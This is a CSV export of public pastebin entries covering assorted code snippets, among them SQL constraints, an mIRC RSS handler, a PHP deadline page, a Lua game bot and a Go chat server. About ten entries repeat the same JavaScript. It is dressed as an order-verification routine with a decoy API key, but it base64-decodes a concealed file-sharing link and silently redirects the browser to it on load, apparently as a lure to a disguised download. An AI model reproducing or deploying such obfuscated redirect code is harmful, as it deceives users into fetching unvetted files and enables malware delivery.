id,title,username,language,date,content
aDbf9T2z,petle1,Cassimus,C#,Tuesday 25th of March 2025 11:19:57 AM CDT,"#region zad1
// System.Console.WriteLine(""Podaj liczbę calkowitą: "");
// int liczba = int.Parse(Console.ReadLine());
// System.Console.WriteLine(""Ile razy mam dodać 5?"");
// int licznik = int.Parse(Console.ReadLine());

// int suma = liczba;

// for(int i = 0; i < licznik; i++  )
// {
//     suma += 5;
//     System.Console.WriteLine($""{i+1}. Po dodaniu 5 {i+1} raz: {suma}"");
// }

// DRY - Don't Repeate Yourself 
#endregion"
AgtzJXq9,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:18:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/861/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k0KjsMzv,Untitled,Sansuall,MySQL,Tuesday 25th of March 2025 11:14:45 AM CDT,"| entry  | InventoryType | AllowableClass | AllowableRace | ItemLevel | subclass | name                                | name_loc8                                                       | class | itemset | tooltip                                                                                                                                                                                                                       | tooltip_loc8                                                                                                                                                                                                                                                                                                                                                         |
+--------+---------------+----------------+---------------+-----------+----------+-------------------------------------+-----------------------------------------------------------------+-------+---------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 300104 |             0 |             -1 |            -1 |        30 |        5 | Uldir Mythic (385-395 ilvl + other) | Ульдир Мифический (385-395 илвл + допы)                         |    22 |       0 | Upon purchase, you will receive one item 385-395 iLvl, from 1000 to 7000 gold, from 500 to 2500 XP for the Heart of Azeroth, as well as reputation with some factions (each category has its own percentage of random drops). | При приобретении вы получаете одну вещь 385-395 ilvl, от 1000 до 7000 золота, от 500 до 2500 ед.опыта Сердца Азерот, а также репутацию с некоторыми фракциями (каждая категория имеет свой % случайного выпадения).
"
32kPG2dd,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:06:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/632/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Mn9E1xmZ,Copiar em Aula,Ninbo,JavaScript,Tuesday 25th of March 2025 10:57:45 AM CDT,"ALTER TABLE pastebin.""USER"" 
	ADD CONSTRAINT nome_maior_4 CHECK (LENGTH(nome) >= 4),
	ADD CONSTRAINT email_maior_10 check (LENGTH(email) >= 10),
	ADD CONSTRAINT password_has_needed_chars CHECK (
		(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[A-Z]', '', 'g'))) >= 2 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[a-z]', '', 'g'))) >= 4 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[0-9]', '', 'g'))) >= 3 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[!""#$%\/()""=?»«~^\\\.-_:.;,]', '', 'g'))) >= 2
	)
;"
DtJAHJm2,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:54:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/521/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
De1CtkTP,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:42:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/393/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
atCgmkyu,RSS,Tiago_f,mIRC,Tuesday 25th of March 2025 10:37:15 AM CDT,"  elseif ($devent == sclick) {
    if ($did == 6) {
      if ($did(3)) && ($did(4)) {
        var %u = $replace($did(4),$chr(32),% $+ 20)
        if (%rss.edit) {
          var %n = $encode($did(3),m),%v = $cell(feedr,3,1)),%e = %v $+ $chr(1) $+ *
          while ($hfind(rssdone,%e,1,w)) {
            var %i = $v1
            hadd rssdone $+(%n,$chr(1),$wd(%i,2,1)) 1
            hdel rssdone %i
          }
          hadd rssdone SHA1: $+ %n $hget(rssdone,SHA1: $+ %v)
          hdel rssdone SHA1: $+ %v
          hadd rss %u $calc($wd($did(feedr,3).seltext,5,32) -1) $did(3)
          hdel rss %rss.edit
          did -co feedr 3 $did(feedr,3).sel 1 +fs 0 0 $wd($did(feedr,3).seltext,5,32) $did(3) $+ 	+ 0 0 0 %u
        }
        elseif ( When I add a new one, stop when it already exists ) 

        else {
          hadd rss %u 0 $did(3)
          mdxunsel feedr 3
          did -ac feedr 3 1 + 0 0 1 $did(3) $+ 	+ 0 0 0 %u
        }
        hsave -ob rss $_tabdir(rss.tbl)
        did $iif($did(feedr,3).sel,-e,-b) feedr 6,8,24,26
        did $iif($did(feedr,3).lines >= 1,-e,-b) feedr 7
      }
      else { beep.error | halt }
    }
  }
"
mE4aNii4,dmsr.php,somdcomputerguy,PHP,Tuesday 25th of March 2025 10:33:44 AM CDT,"<? require_once('common.php'); checkUser(); ?>
<!DOCTYPE html>
<html><head>
<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>
<meta http-equiv='Content-Language' content='EN'>
<meta name=""viewport"" content=""width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no"">
<title>DMS</title>
<style>
body {
  font-size: 1.3em;
  font-size-adjust: from-font;
  font-variant: small-caps;
  color: orange;
  background: rgba(0, 0, 0, 1);
}

button {
  margin: 1px;
  padding: 3px 5px;
  font-size: 12px;
  border-radius: 3px;
}
</style></head><body>
<center><br><br><div id='dateTime'></div>
<script src='dtscript.js'></script>

<?
if(isset($_GET['hgen'])) { hgenesis(); }
if(isset($_GET['update'])) { update(); }
if(isset($_GET['logout'])) { logoutUser(); }

date_default_timezone_set('America/New_York');

$CurrenTime = time();
$FinalTime  = '+25 days 25 minutes';
$FinalFile  = 'dmsr.txt';
$datestr   = ""l\, F j\<\s\u\p\>\<\s\m\a\l\l\>S\<\/\s\m\a\l\l\>\<\/\s\u\p\> Y g\:i A"";

if(!file_exists($FinalFile)) { file_put_contents($FinalFile, $CurrenTime); }

$FinalCon = file_get_contents($FinalFile); $FinalConStr = date($datestr, $FinalCon);

echo ""<br>Switch closed $FinalConStr<br><br>Update by "" .  date ($datestr, strtotime($FinalTime, $FinalCon));

if(strtotime($FinalTime, $FinalCon) < $CurrenTime){
	echo ""<br><br><strong>Deadline!</strong><br>"";
	//unlink($FinalFile);
	// mailer();
	}

if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
echo ""<br><br><button onclick=window.location.replace('?logout')>Log out</button>&ensp;&ensp;<button onclick=window.location.replace('?update')>Update</button>""; } else {echo ""<br><br><button onclick=window.location.replace('login.php')>Logged out</button>&ensp;&ensp;"";
if(strtotime($FinalTime, $FinalCon) < $CurrenTime){echo ""&ensp;&ensp;<button onclick=window.location.replace('?hgen')>HGenesis</button>"";}
}

function update(){
	if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
	date_default_timezone_set('America/New_York');
	
	$CurrenTime = time();
    $FinalFile  = 'dmsr.txt'; $NotifyFile = 'dmsr_notify.txt';

	file_put_contents($FinalFile, $CurrenTime); echo ""<script>location.href = 'dmsr.php'</script>"";
}}

function hgenesis(){
	if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
		$FinalFile  = 'dmsr.txt';
		unlink($FinalFile);
		echo ""<script>location.href = 'dmsr.php'</script>"";
}}

function mailer(){
$subject = ""DMS Notifier"";
$message = ""Hey now. <a href='https://gowansb.powweb.com/dms/dmsr.php'>Login if you have to and check if you want to</a>."";
$mailto  = """";
$headers = ""From: "";

mail(""$mailto"", ""$subject"" , ""$message"", ""$headers"");
}

?></center></body></html>"
Erzxxp0A,Insights Breadcrumbs - Inline,Aleso1,JavaScript,Tuesday 25th of March 2025 10:30:50 AM CDT,"<nav aria-label=""Breadcrumb"">
  <ul class=""breadcrumbs"" itemscope itemtype=""https://schema.org/BreadcrumbList"" style=""display:flex; flex-wrap:wrap; align-items:center; gap:6px; font-size:14px; list-style:none; padding:0; margin:0;"">
    
    <li itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center;"">
      <a href=""https://www.ie.edu/insights/"" itemprop=""item"" style=""text-decoration:none; color:#0073e6;"">
        <span itemprop=""name"">Home</span>
      </a>
      <meta itemprop=""position"" content=""1"" />
    </li>

    <li style=""display:flex; align-items:center;"">»</li>

    <li itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center;"">
      <a href=""https://www.ie.edu/insights/articles/"" itemprop=""item"" style=""text-decoration:none; color:#0073e6;"">
        <span itemprop=""name"">Articles</span>
      </a>
      <meta itemprop=""position"" content=""2"" />
    </li>

    <li style=""display:flex; align-items:center;"">»</li>

    <li class=""current"" itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center; color:#333;"">
      <span itemprop=""name"">Politicians Take to the Pods</span>
      <meta itemprop=""position"" content=""3"" />
    </li>

  </ul>
</nav>
"
QQSYebyW,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:30:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/206/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RHG99pER,Hireling CaveBot Dialog,martintokio,Lua,Tuesday 25th of March 2025 10:19:48 AM CDT,"--Hireling Dialog
local hireling_settings = {
    dish_name = ""Carrion Casserole"",
    dish_id = 29414,
    dish_amount = 10,
    hireling_name = ""Otclient""
}

function get_item_count(itemId)
    local count = 0
    for _, container in pairs(g_game.getContainers()) do
        for _, item in ipairs(container:getItems()) do
            if item:getId() == itemId then
                count = count + item:getCount()
            end
        end
    end
    for _, item in ipairs(player:getItems()) do
        if item:getId() == itemId then
            count = count + item:getCount()
        end
    end
    return count
end

function check_purse()
    local purse = getContainerByName(""Store inbox"")
    if not purse then
        g_game.use(g_game.getLocalPlayer():getInventoryItem(InventorySlotPurse))
    end
end

function talk_hireling()
    check_purse()
    CaveBot.Conversation(""hi"")
    schedule(200, function()
        check_purse()
        CaveBot.Conversation(""food"")
    end)
    schedule(400, function()
        check_purse()
        CaveBot.Conversation(""specific"")
    end)
    schedule(800, function()
        check_purse()
        CaveBot.Conversation(hireling_settings.dish_name)
    end)
    schedule(1200, function()
        check_purse()
        CaveBot.Conversation(""yes"")
    end)
    
    schedule(1600, function()
        if get_item_count(hireling_settings.dish_id) < hireling_settings.dish_amount then
            check_and_buy()
        end
    end)
end

function buy_hireling()
    local hireling = getCreatureByName(hireling_settings.hireling_name)
    if not hireling then
        print(""CaveBot[follow]: can't find hireling to follow"")
        return
    end

    local hireling_pos = hireling:getPosition()
    local pos = pos()

    if getDistanceBetween(hireling_pos, pos) > 2 then
        follow(hireling)
        schedule(1000, buy_hireling)
        return
    end

    g_game.cancelFollow()
    talk_hireling()
end

function check_and_buy()
    check_purse()

    if get_item_count(hireling_settings.dish_id) < hireling_settings.dish_amount then
        buy_hireling()
    end
end

check_and_buy()
return true"
YqtCV4rW,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:18:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/717/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
farArjbe,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:06:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/365/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sgBB7wyd,tcp server/client,arekkusu6,Go,Tuesday 25th of March 2025 10:03:32 AM CDT,"//server
package main

import (
	""encoding/json""
	""fmt""
	""log""
	""net""
	""sync""
)


type Datas struct {
	ID		string		`json:""id""`
	Text	string		`json:""text""`
}


var (
	clients = make(map[net.Conn]string)
	mu sync.Mutex
)


func handleConnection(conn net.Conn, id string) {
    defer func()  {
		conn.Close()
		mu.Lock()
		delete(clients, conn)
		mu.Unlock()
	}()


    for {
		var dec = json.NewDecoder(conn)

		var datas Datas

		if err := dec.Decode(&datas); err != nil {
			return
		}

		fmt.Println(datas)

		mu.Lock()
        for client, roomID := range clients {
			if roomID == id && client != conn {
				if err := json.NewEncoder(client).Encode(&datas); err != nil {
					log.Println(err)
					return
				}
			}
		}
		mu.Unlock()
    }
}


func startServer() {
	addr, err := net.ResolveTCPAddr(""tcp"", "":8000"")

    if err != nil {
        log.Println(err)
		return
    }

    ln, err := net.ListenTCP(""tcp"", addr)

    if err != nil {
        log.Println(err)
		return
    }

    defer ln.Close()

    for {
        conn, err := ln.Accept()

        if err != nil {
            log.Println(err)
			return
        }

		var idB = make([]byte, 1024)

		n, err := conn.Read(idB)

		if err != nil {
			log.Println(err)
			return
		}

		var id = string(idB[:n])

		mu.Lock()
		clients[conn] = id
		mu.Unlock()

		fmt.Println(clients)

	    go handleConnection(conn, id)
	}
}

//client
package main

import (
	""encoding/json""
	""fmt""
	""log""
	""net""
)


func read(conn net.Conn) {
	for {
		var received Datas

		var dec = json.NewDecoder(conn)

		if err := dec.Decode(&received); err != nil {
			log.Println(err)
			return
		}

		fmt.Println(received.Text)
	}
}


func write(conn net.Conn, id string, username string) {
	for {
		var text string

		if _, err := fmt.Scanln(&text); err != nil {
			log.Println(err)
			return
		}
	
		var datas = Datas{
			ID: id,
			Text: fmt.Sprintf(""%s said %q"", username, text),
		}
	
		var enc = json.NewEncoder(conn)
	
		if err := enc.Encode(&datas); err != nil {
			log.Println(err)
			return
		}
	}
}


func startClient(id string, username string) {
	conn, err := net.Dial(""tcp"", ""localhost:8000"")

	if err != nil {
		log.Println(err)
		return
	}

	if _, err := conn.Write([]byte(id)); err != nil {
		log.Println(err)
		return
	}

	go read(conn)
	go write(conn, id, username)

	select {}
}"
uzFXfvLx,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:54:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/598/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8C281fLx,Untitled,crescentfresh,C#,Tuesday 25th of March 2025 09:54:05 AM CDT,"public class NodeCanvasCustomBT : MonoBehaviour
    {
        private NodeCanvas.BehaviourTrees.BehaviourTree _bt;
        private NodeCanvas.Framework.Blackboard _blackboard;
        private BehaviourTreeOwner _behaviourTreeOwner;
        private Action _btFinished;
        [SerializeField] private bool debug;
      
        public bool IsRunning { get; private set; }

        public void SetBehaviourTree(NodeCanvas.BehaviourTrees.BehaviourTree bt)
        {
            _bt = bt;
            _behaviourTreeOwner.repeat = false;
            _behaviourTreeOwner.enabled = false;
        }
        
        public void StartBehaviourTree(Action btFinished)
        {
            _btFinished = btFinished;
            //_behaviourTreeOwner.blackboard = _blackboard;
            _behaviourTreeOwner.StartBehaviour(_bt, Callback);
            _behaviourTreeOwner.enabled = true;
            IsRunning = true;
        }

        private void Callback(bool obj)
        {
            if (debug) Debug.Log($""BT Finished {obj}"");
            IsRunning = false;
            _btFinished?.Invoke();
        }

        private void Awake()
        {
            _behaviourTreeOwner = GetComponent<BehaviourTreeOwner>();
            _blackboard = GetComponent<NodeCanvas.Framework.Blackboard>();
        }

        public void SetVariable(string variable, object value)
        {
            _blackboard.SetVariableValue(variable, value);
        }
        
    }"
uYN1hGYG,Untitled,crescentfresh,C#,Tuesday 25th of March 2025 09:52:28 AM CDT,"public class NodeCanvasCustomBT : MonoBehaviour
    {
        private NodeCanvas.BehaviourTrees.BehaviourTree _bt;
        private NodeCanvas.Framework.Blackboard _blackboard;
        private BehaviourTreeOwner _behaviourTreeOwner;
        private Action _btFinished;
        [SerializeField] private bool debug;
      
        public bool IsRunning { get; private set; }

        public void SetBehaviourTree(NodeCanvas.BehaviourTrees.BehaviourTree bt)
        {
            _bt = bt;
            _behaviourTreeOwner.repeat = false;
            _behaviourTreeOwner.enabled = false;
        }
        
        public void StartBehaviourTree(Action btFinished)
        {
            _btFinished = btFinished;
            //_behaviourTreeOwner.blackboard = _blackboard;
            _behaviourTreeOwner.StartBehaviour(_bt, Callback);
            _behaviourTreeOwner.enabled = true;
            IsRunning = true;
        }

        private void Callback(bool obj)
        {
            if (debug) Debug.Log($""BT Finished {obj}"");
            IsRunning = false;
            _btFinished?.Invoke();
        }

        private void Start()
        {
            _blackboard.SetVariableValue(""_transform"", gameObject);
        }

        private void Awake()
        {
            _behaviourTreeOwner = GetComponent<BehaviourTreeOwner>();
            _blackboard = GetComponent<NodeCanvas.Framework.Blackboard>();
        }

        public void SetVariable(string variable, object value)
        {
            _blackboard.SetVariableValue(variable, value);
        }
        
    }"
m2TVfGas,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:42:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/709/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8fNWarF4,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:29:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/230/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
